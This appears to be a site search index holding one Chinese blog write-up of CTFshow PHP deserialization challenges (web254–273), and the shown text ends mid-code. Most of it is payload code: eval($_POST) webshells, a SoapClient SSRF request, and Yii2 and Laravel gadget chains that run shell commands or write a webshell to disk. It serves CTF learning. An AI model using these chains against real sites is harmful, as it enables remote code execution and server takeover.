<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CTF_SHOW之web入门反序列化部分wp</title>
      <link href="/2022/03/23/jian-web-fan-xu-lie-hua/"/>
      <url>/2022/03/23/jian-web-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><h4 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h4><p>只需通过get传参将username和password赋值为xxxxxx即可</p><h4 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?php&#x2F;*\# -*- coding: utf-8 -*-\# @Author: h1xa\# @Date:  2020-12-02 17:44:47\# @Last Modified by:  h1xa\# @Last Modified time: 2020-12-02 19:29:02\# @email: h1xa@ctfer.com\# @link: https:&#x2F;&#x2F;ctfer.com*&#x2F;error_reporting(0);highlight_file(__FILE__);include(&#39;flag.php&#39;);class ctfShowUser&#123;  public $username&#x3D;&#39;xxxxxx&#39;;  public $password&#x3D;&#39;xxxxxx&#39;;  public $isVip&#x3D;false;  public function checkVip()&#123;    return $this-&gt;isVip;  &#125;  public function login($u,$p)&#123;    return $this-&gt;username&#x3D;&#x3D;&#x3D;$u&amp;&amp;$this-&gt;password&#x3D;&#x3D;&#x3D;$p;  &#125;  public function vipOneKeyGetFlag()&#123;    if($this-&gt;isVip)&#123;      global $flag;      echo &quot;your flag is &quot;.$flag;    &#125;else&#123;      echo &quot;no vip, no flag&quot;;    &#125;  &#125;&#125;$username&#x3D;$_GET[&#39;username&#39;];$password&#x3D;$_GET[&#39;password&#39;];if(isset($username) &amp;&amp; isset($password))&#123;  $user &#x3D; unserialize($_COOKIE[&#39;user&#39;]);    if($user-&gt;login($username,$password))&#123;    if($user-&gt;checkVip())&#123;      $user-&gt;vipOneKeyGetFlag();    &#125;  &#125;else&#123;    echo &quot;no vip,no flag&quot;;  &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过cookie将user序列化后的值传入，同时将username和password赋值为xxxxxx即可</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpclass ctfShowUser&#123;  public $isVip &#x3D; true;&#125;$user &#x3D; new ctfShowUser();echo(urlencode(serialize($user)));url：http:&#x2F;&#x2F;3e8f11f0-0df8-4e12-8f12-9da9900504df.challenge.ctf.show&#x2F;?username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿到flag</p><h4 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-02 17:44:47# @Last Modified by:   h1xa# @Last Modified time: 2020-12-02 19:29:02# @email: h1xa@ctfer.com# @link: https:&#x2F;&#x2F;ctfer.com*&#x2F;error_reporting(0);highlight_file(__FILE__);include(&#39;flag.php&#39;);class ctfShowUser&#123;    public $username&#x3D;&#39;xxxxxx&#39;;    public $password&#x3D;&#39;xxxxxx&#39;;    public $isVip&#x3D;false;    public function checkVip()&#123;        return $this-&gt;isVip;    &#125;    public function login($u,$p)&#123;        return $this-&gt;username&#x3D;&#x3D;&#x3D;$u&amp;&amp;$this-&gt;password&#x3D;&#x3D;&#x3D;$p;    &#125;    public function vipOneKeyGetFlag()&#123;        if($this-&gt;isVip)&#123;            global $flag;            if($this-&gt;username!&#x3D;&#x3D;$this-&gt;password)&#123;                    echo &quot;your flag is &quot;.$flag;              &#125;        &#125;else&#123;            echo &quot;no vip, no flag&quot;;        &#125;    &#125;&#125;$username&#x3D;$_GET[&#39;username&#39;];$password&#x3D;$_GET[&#39;password&#39;];if(isset($username) &amp;&amp; isset($password))&#123;    $user &#x3D; unserialize($_COOKIE[&#39;user&#39;]);        if($user-&gt;login($username,$password))&#123;        if($user-&gt;checkVip())&#123;            $user-&gt;vipOneKeyGetFlag();        &#125;    &#125;else&#123;        echo &quot;no vip,no flag&quot;;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这次需要将get传参的password与username值与cookie序列化username与password的值相等，但username与password的值又不能相同，而!==又为弱比较，所以可以在后面添加数字即可</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpclass ctfShowUser&#123;public $isVip &#x3D; true;public $password &#x3D; &#39;xxxxxx1&#39;;public $username &#x3D; &#39;xxxxxx&#39;;&#125;$user &#x3D; new ctfShowUser();echo(urlencode(serialize($user)));url：http:&#x2F;&#x2F;9292eade-bbdb-49e1-a88b-03d2b9e8c687.challenge.ctf.show&#x2F;?username&#x3D;xxxxxx&amp;password&#x3D;xxxxxx1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿到flag</p><h4 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-02 17:44:47# @Last Modified by:   h1xa# @Last Modified time: 2020-12-02 20:33:07# @email: h1xa@ctfer.com# @link: https:&#x2F;&#x2F;ctfer.com*&#x2F;error_reporting(0);highlight_file(__FILE__);class ctfShowUser&#123;    private $username&#x3D;&#39;xxxxxx&#39;;    private $password&#x3D;&#39;xxxxxx&#39;;    private $isVip&#x3D;false;    private $class &#x3D; &#39;info&#39;;    public function __construct()&#123;        $this-&gt;class&#x3D;new info();    &#125;    public function login($u,$p)&#123;        return $this-&gt;username&#x3D;&#x3D;&#x3D;$u&amp;&amp;$this-&gt;password&#x3D;&#x3D;&#x3D;$p;    &#125;    public function __destruct()&#123;        $this-&gt;class-&gt;getInfo();    &#125;&#125;class info&#123;    private $user&#x3D;&#39;xxxxxx&#39;;    public function getInfo()&#123;        return $this-&gt;user;    &#125;&#125;class backDoor&#123;    private $code;    public function getInfo()&#123;        eval($this-&gt;code);    &#125;&#125;$username&#x3D;$_GET[&#39;username&#39;];$password&#x3D;$_GET[&#39;password&#39;];if(isset($username) &amp;&amp; isset($password))&#123;    $user &#x3D; unserialize($_COOKIE[&#39;user&#39;]);    $user-&gt;login($username,$password);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现在ctfShowUser类中有一个魔术方法__construct，调用该类时会自动触发该魔术方法，就会自动创建info类的实例，而在backDoor类中又有eval函数，那么我们只需要在__construct方法中将info()，改为backDoor即可，</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpclass ctfShowUser&#123;    private $username&#x3D;&#39;xxxxxx&#39;;    private $password&#x3D;&#39;xxxxxx&#39;;    private $isVip&#x3D;false;    private $class &#x3D; &#39;info&#39;;    public function __construct()&#123;        $this-&gt;class&#x3D;new backDoor();    &#125;    public function login($u,$p)&#123;        return $this-&gt;username&#x3D;&#x3D;&#x3D;$u&amp;&amp;$this-&gt;password&#x3D;&#x3D;&#x3D;$p;    &#125;    public function __destruct()&#123;        $this-&gt;class-&gt;getInfo();    &#125;&#125;class info&#123;    private $user&#x3D;&#39;xxxxxx&#39;;    public function getInfo()&#123;        return $this-&gt;user;    &#125;&#125;class backDoor&#123;    private $code&#x3D;&#39;eval($_POST[1]);&#39;;    public function getInfo()&#123;        eval($this-&gt;code);    &#125;&#125;$user &#x3D; new ctfShowUser();echo(urlencode(serialize($user)));url：http:&#x2F;&#x2F;ba363cdc-e1b2-49e4-bfbb-29aa388b2285.challenge.ctf.show&#x2F;?username&#x3D;xxxxxx&amp;password&#x3D;xxxxxxpsot:1&#x3D;system(&quot;tac flag.php&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿到flag</p><h4 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h4><pre class="line-numbers language-none"><code class="language-none">if(isset($username) &amp;&amp; isset($password))&#123;  if(!preg_match(&#39;&#x2F;[oc]:\d+:&#x2F;i&#39;, $_COOKIE[&#39;user&#39;]))&#123;    $user &#x3D; unserialize($_COOKIE[&#39;user&#39;]);  &#125;  $user-&gt;login($username,$password);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这次对user增加了过滤，即不能匹配到o:数字</p><p>那么我们只需要在数字前加上＋号即可</p><p>payload：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpclass ctfShowUser&#123;  public $username&#x3D;&#39;xxxxxx&#39;;  public $password&#x3D;&#39;xxxxxx&#39;;  public $isVip&#x3D;false;  public $class &#x3D; &#39;info&#39;;  public function __construct()&#123;​    $this-&gt;class&#x3D;new backDoor();  &#125;  public function login($u,$p)&#123;​    return $this-&gt;username&#x3D;&#x3D;&#x3D;$u&amp;&amp;$this-&gt;password&#x3D;&#x3D;&#x3D;$p;  &#125;  public function __destruct()&#123;​    $this-&gt;class-&gt;getInfo();  &#125;&#125;class info&#123;  public $user&#x3D;&#39;xxxxxx&#39;;  public function getInfo()&#123;​    return $this-&gt;user;  &#125;&#125;class backDoor&#123;  public $code&#x3D;&#39;eval($_POST[1]);&#39;;  public function getInfo()&#123;​    eval($this-&gt;code);  &#125;&#125;$user &#x3D; new ctfShowUser();$a &#x3D; serialize($user);$b &#x3D; str_replace(&quot;:11&quot;,&quot;:+11&quot;,$a);$c &#x3D; str_replace(&quot;:8&quot;,&quot;:+8&quot;,$b);echo urlencode($c);url:http:&#x2F;&#x2F;b2b85509-d640-45dd-9d06-74f6a013b0a6.challenge.ctf.show&#x2F;?username&#x3D;xxxxxx&amp;password&#x3D;xxxxxxpost1&#x3D;system(&quot;tac flag.php&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>拿到flag</p><h4 id="web259"><a href="#web259" class="headerlink" title="web259"></a>web259</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?phphighlight_file(__FILE__);$vip &#x3D; unserialize($_GET[&#39;vip&#39;]);&#x2F;&#x2F;vip can get flag one key$vip-&gt;getFlag();Notice: Undefined index: vip in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 6Fatal error: Uncaught Error: Call to a member function getFlag() on bool in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php:8 Stack trace: #0 &#123;main&#125; thrown in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php on line 8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再次来到新的知识点，看群主视频，在本地测试了一下：</p><p>SoapClient类 __call 魔术方法</p><p>__call() 魔术方法：当调用一个类不存在的方法时候会触发这个魔术方法</p><p>当调用 SoapClient 类的 __call() 魔术方法的时候，会发送一个 POST 请求，请求的参数由着 SoapClient 类的一些参数决定。</p><p>本地测试：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$ua &#x3D; &quot;ctfshow\r\nContent-Type:application&#x2F;x-www-form-urlencoded\r\nContent-length:13\r\n\r\ntoken&#x3D;ctfshow&quot;;$client &#x3D; new SoapClient(null,array(&#39;uri&#39;&#x3D;&gt;&#39;http:&#x2F;&#x2F;127.0.0.1:9999&#x2F;&#39;,&#39;location&#39;&#x3D;&gt;&#39;http:&#x2F;&#x2F;127.0.0.1:9999&#x2F;ctfshow&#39;,&#39;user_agent&#39;&#x3D;&gt;$ua));$client-&gt;getFlag();<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/web_259.png"></p><p>那么再根据给出的flag.php进行修改即可：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php$ua &#x3D; &quot;ctfshow\r\nX-Forwarded-For:127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type:application&#x2F;x-www-form-urlencoded\r\nContent-length:13\r\n\r\ntoken&#x3D;ctfshow&quot;;$client &#x3D; new SoapClient(null,array(&#39;uri&#39;&#x3D;&gt;&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;&#39;,&#39;location&#39;&#x3D;&gt;&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php&#39;,&#39;user_agent&#39;&#x3D;&gt;$ua));echo urlencode(serialize($client));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&#39;flag.php&#39;);if(preg_match(&#39;&#x2F;ctfshow_i_love_36D&#x2F;&#39;,serialize($_GET[&#39;ctfshow&#39;])))&#123;  echo $flag;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接将ctfhsow赋值为ctfshow_i_love_36D</p><p>拿到flag</p><h4 id="web261"><a href="#web261" class="headerlink" title="web261"></a>web261</h4><p>不是很明白，先跳过</p><h4 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h4><p>在注释中发现message.php，访问：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-12-03 15:13:03# @Last Modified by:   h1xa# @Last Modified time: 2020-12-03 15:17:17# @email: h1xa@ctfer.com# @link: https:&#x2F;&#x2F;ctfer.com*&#x2F;highlight_file(__FILE__);include(&#39;flag.php&#39;);class message&#123;    public $from;    public $msg;    public $to;    public $token&#x3D;&#39;user&#39;;    public function __construct($f,$m,$t)&#123;        $this-&gt;from &#x3D; $f;        $this-&gt;msg &#x3D; $m;        $this-&gt;to &#x3D; $t;    &#125;&#125;if(isset($_COOKIE[&#39;msg&#39;]))&#123;    $msg &#x3D; unserialize(base64_decode($_COOKIE[&#39;msg&#39;]));    if($msg-&gt;token&#x3D;&#x3D;&#39;admin&#39;)&#123;        echo $flag;    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么只需要构造exp即可：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpclass message&#123;    public $token&#x3D;&#39;admin&#39;;&#125;$a &#x3D; new message();echo base64_encode(serialize($a));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h4><p>弄了半天也不知道咋弄，就又只能先去看群主给的视频，说是有源码提示，<a href="http://www.zip,下载下来后,应该是session反序列化/">www.zip，下载下来后，应该是session反序列化</a></p><pre class="line-numbers language-none"><code class="language-none">ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现在登录框中用到了file_put_content()函数，而username和password我们可控，那么就可以写入自己的🐎，exp：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpsession_start();class User&#123;    public $username;    public $password;    public $status;    function __construct($username,$password)&#123;        $this-&gt;username &#x3D; $username;        $this-&gt;password &#x3D; $password;    &#125;    function setStatus($s)&#123;        $this-&gt;status&#x3D;$s;    &#125; &#125;$a &#x3D;  new User(&#39;1.php&#39;,&#39;&lt;?php eval($_POST[1]);phpinfo();?&gt;&#39;);echo base64_encode(&quot;|&quot;.serialize($a));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改cookie中limit的值，访问登录框</p><p><img src="/images/web_263a.png"></p><p>然后再访问check.php</p><p><img src="/images/web_263b.png"></p><p>然后再访问log-1.php</p><p><img src="/images/web_263c.png"></p><p>然后再直接通过post的方式进行执行命令即可拿到flag</p><h4 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h4><p>又是字符逃逸，直接上payload：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpclass message&#123;    public $from;    public $msg;    public $to;    public $token&#x3D;&#39;user&#39;;    public function __construct($f,$m,$t)&#123;        $this-&gt;from &#x3D; $f;        $this-&gt;msg &#x3D; $m;        $this-&gt;to &#x3D; $t;    &#125;&#125;function filter($msg)&#123;    return $msg &#x3D; str_replace(&#39;fuck&#39;, &#39;loveU&#39;, $msg);&#125;$msg1 &#x3D; new message(&#39;a&#39;,&#39;b&#39;,&#39;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#39;);$a &#x3D; serialize($msg1);$b &#x3D; filter($a);echo $b;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后再访问messag.php并在cookie中添加msg的值，即可拿到flag</p><h4 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?phperror_reporting(0);include(&#39;flag.php&#39;);highlight_file(__FILE__);class ctfshowAdmin&#123;    public $token;    public $password;    public function __construct($t,$p)&#123;        $this-&gt;token&#x3D;$t;        $this-&gt;password &#x3D; $p;    &#125;    public function login()&#123;        return $this-&gt;token&#x3D;&#x3D;&#x3D;$this-&gt;password;    &#125;&#125;$ctfshow &#x3D; unserialize($_GET[&#39;ctfshow&#39;]);$ctfshow-&gt;token&#x3D;md5(mt_rand());if($ctfshow-&gt;login())&#123;    echo $flag;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接上exp</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpclass ctfshowAdmin&#123;    public $token &#x3D; &quot;vip&quot;;    public $password &#x3D; &quot;vip&quot;;&#125;$a &#x3D; new ctfshowAdmin();$a-&gt;password &#x3D;&amp; $a-&gt;token;echo urlencode(serialize($a));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h4><pre class="line-numbers language-none"><code class="language-none">&lt;?phphighlight_file(__FILE__);include(&#39;flag.php&#39;);$cs &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);class ctfshow&#123;    public $username&#x3D;&#39;xxxxxx&#39;;    public $password&#x3D;&#39;xxxxxx&#39;;    public function __construct($u,$p)&#123;        $this-&gt;username&#x3D;$u;        $this-&gt;password&#x3D;$p;    &#125;    public function login()&#123;        return $this-&gt;username&#x3D;&#x3D;&#x3D;$this-&gt;password;    &#125;    public function __toString()&#123;        return $this-&gt;username;    &#125;    public function __destruct()&#123;        global $flag;        echo $flag;    &#125;&#125;$ctfshowo&#x3D;@unserialize($cs);if(preg_match(&#39;&#x2F;ctfshow&#x2F;&#39;, $cs))&#123;    throw new Exception(&quot;Error $ctfshowo&quot;,1);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很明显的是需要我们执行__destruct魔术方法，但又要绕过报错方法（可以利用破环序列化，但是不破坏类名，这样它虽然会抛出异常，但是还是会正常的执行摧毁方法）,payload:</p><pre class="line-numbers language-none"><code class="language-none">post:O:7:&quot;ctfshow&quot;:2:&#123;jian&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>用bp提交，拿到flag</p><h4 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h4><p>再次尬住了，翻了半天也找不到突破口，继续看了群主给的wp视频，，先用弱口令登录进去，然后查看源码，发现?view-source和是yii框架，在url后加上&amp;view-source，出现</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;&#x2F;backdoor&#x2F;shellunserialize(base64_decode($_GET[&#39;code&#39;]))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后直接用给出的链子：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace yii\rest&#123;    class CreateAction&#123;        public $checkAccess;        public $id;        public function __construct()&#123;            $this-&gt;checkAccess &#x3D; &#39;exec&#39;;            $this-&gt;id &#x3D; &#39;cp &#x2F;flag &#x2F;var&#x2F;www&#x2F;html&#x2F;basic&#x2F;web&#x2F;1.txt&#39;;        &#125;    &#125;&#125;namespace Faker&#123;    use yii\rest\CreateAction;    class Generator&#123;        protected $formatters;        public function __construct()&#123;            $this-&gt;formatters[&#39;close&#39;] &#x3D; [new CreateAction, &#39;run&#39;];        &#125;    &#125;&#125;namespace yii\db&#123;    use Faker\Generator;    class BatchQueryResult&#123;        private $_dataReader;        public function __construct()&#123;            $this-&gt;_dataReader &#x3D; new Generator;        &#125;    &#125;&#125;namespace&#123;    echo base64_encode(serialize(new yii\db\BatchQueryResult));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再访问1.txt,拿到flag</p><h4 id="web268"><a href="#web268" class="headerlink" title="web268"></a>web268</h4><p>这题在上一题的基础上过滤了flag，换个链子：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace yii\rest &#123;    class Action    &#123;        public $checkAccess;    &#125;    class IndexAction    &#123;        public function __construct($func, $param)        &#123;            $this-&gt;checkAccess &#x3D; $func;            $this-&gt;id &#x3D; $param;        &#125;    &#125;&#125;namespace yii\web &#123;    abstract class MultiFieldSession    &#123;        public $writeCallback;    &#125;    class DbSession extends MultiFieldSession    &#123;        public function __construct($func, $param)        &#123;            $this-&gt;writeCallback &#x3D; [new \yii\rest\IndexAction($func, $param), &quot;run&quot;];        &#125;    &#125;&#125;namespace yii\db &#123;    use yii\base\BaseObject;    class BatchQueryResult    &#123;        private $_dataReader;        public function __construct($func, $param)        &#123;            $this-&gt;_dataReader &#x3D; new \yii\web\DbSession($func, $param);        &#125;    &#125;&#125;namespace &#123;    $exp &#x3D; new \yii\db\BatchQueryResult(&#39;shell_exec&#39;, &quot;echo &#39;&lt;?php eval(\$_POST[1]);phpinfo();?&gt;&#39; &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;basic&#x2F;web&#x2F;1.php &quot;);    echo(base64_encode(serialize($exp)));&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="web269-270"><a href="#web269-270" class="headerlink" title="web269-270"></a>web269-270</h4><p>与268相同</p><h4 id="web271"><a href="#web271" class="headerlink" title="web271"></a>web271</h4><p>laravel 5.7的反序列化，先复现吧，等做到后面的关再理解：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace Illuminate\Foundation\Testing&#123;class PendingCommand&#123;protected $command;protected $parameters;protected $app;public $test;public function __construct($command, $parameters,$class,$app)    &#123;        $this-&gt;command &#x3D; $command;        $this-&gt;parameters &#x3D; $parameters;        $this-&gt;test&#x3D;$class;        $this-&gt;app&#x3D;$app;    &#125;&#125;&#125;namespace Illuminate\Auth&#123;class GenericUser&#123;protected $attributes;public function __construct(array $attributes)&#123;        $this-&gt;attributes &#x3D; $attributes;    &#125;&#125;&#125;namespace Illuminate\Foundation&#123;class Application&#123;protected $hasBeenBootstrapped &#x3D; false;protected $bindings;public function __construct($bind)&#123;$this-&gt;bindings&#x3D;$bind;&#125;&#125;&#125;namespace&#123;echo urlencode(serialize(new Illuminate\Foundation\Testing\PendingCommand(&quot;system&quot;,array(&#39;cat &#x2F;flag&#39;),new Illuminate\Auth\GenericUser(array(&quot;expectedOutput&quot;&#x3D;&gt;array(&quot;0&quot;&#x3D;&gt;&quot;1&quot;),&quot;expectedQuestions&quot;&#x3D;&gt;array(&quot;0&quot;&#x3D;&gt;&quot;1&quot;))),new Illuminate\Foundation\Application(array(&quot;Illuminate\Contracts\Console\Kernel&quot;&#x3D;&gt;array(&quot;concrete&quot;&#x3D;&gt;&quot;Illuminate\Foundation\Application&quot;))))));&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="web272-273"><a href="#web272-273" class="headerlink" title="web272-273"></a>web272-273</h4><p>Laravel5.8反序列化漏洞,继续用师傅们给的链子：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phpnamespace Illuminate\Broadcasting&#123;     use Illuminate\Bus\Dispatcher;    use Illuminate\Foundation\Console\QueuedCommand;     class PendingBroadcast    &#123;        protected $events;        protected $event;        public function __construct()&#123;            $this-&gt;events&#x3D;new Dispatcher();            $this-&gt;event&#x3D;new QueuedCommand();        &#125;    &#125;&#125;namespace Illuminate\Foundation\Console&#123;     use Mockery\Generator\MockDefinition;     class QueuedCommand    &#123;        public $connection;        public function __construct()&#123;            $this-&gt;connection&#x3D;new MockDefinition();        &#125;    &#125;&#125;namespace Illuminate\Bus&#123;     use Mockery\Loader\EvalLoader;     class Dispatcher    &#123;        protected $queueResolver;        public function __construct()&#123;            $this-&gt;queueResolver&#x3D;[new EvalLoader(),&#39;load&#39;];        &#125;    &#125;&#125;namespace Mockery\Loader&#123;    class EvalLoader    &#123;     &#125;&#125;namespace Mockery\Generator&#123;    class MockDefinition    &#123;        protected $config;        protected $code;        public function __construct()        &#123;            $this-&gt;code&#x3D;&quot;&lt;?php eval(\$_POST[h3]);phpinfo();exit()?&gt;&quot;; &#x2F;&#x2F;此处是PHP代码            $this-&gt;config&#x3D;new MockConfiguration();        &#125;    &#125;    class MockConfiguration    &#123;        protected $name&#x3D;&quot;feng&quot;;    &#125;&#125; namespace&#123;     use Illuminate\Broadcasting\PendingBroadcast;     echo urlencode(serialize(new PendingBroadcast()));&#125;<span aria-hidden="true" 